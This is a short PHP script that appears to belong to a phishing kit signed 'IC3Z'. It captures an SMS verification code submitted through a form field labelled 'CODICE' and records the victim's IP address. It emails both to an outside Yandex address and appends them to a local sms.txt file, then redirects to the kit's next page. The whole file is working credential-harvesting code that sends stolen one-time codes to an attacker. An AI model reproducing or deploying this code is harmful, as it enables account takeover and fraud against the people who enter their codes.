<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "__________________ XXX _____ IC3Z SMS ____ XXX_____________\n";
$message .= "CODICE          : ".$_POST['o18']."\n";
$message .= "______________ INFOS OF MACHINE _________\n";
$message .= "Ip of Machine              : $ip\n";
$message .= "_________| IC3Z  |__________\n";
$send = "nessyouoff@yandex.com";
$subject = "NIK CHARO - $ip ";
$headers = "From:IC3Z <webmaster@localhost.com>";
mail($send,$subject,$message,$headers);
header("Location: icez.php");
$txt = fopen('sms.txt', 'a');
fwrite($txt, $message);
fclose($txt);
?>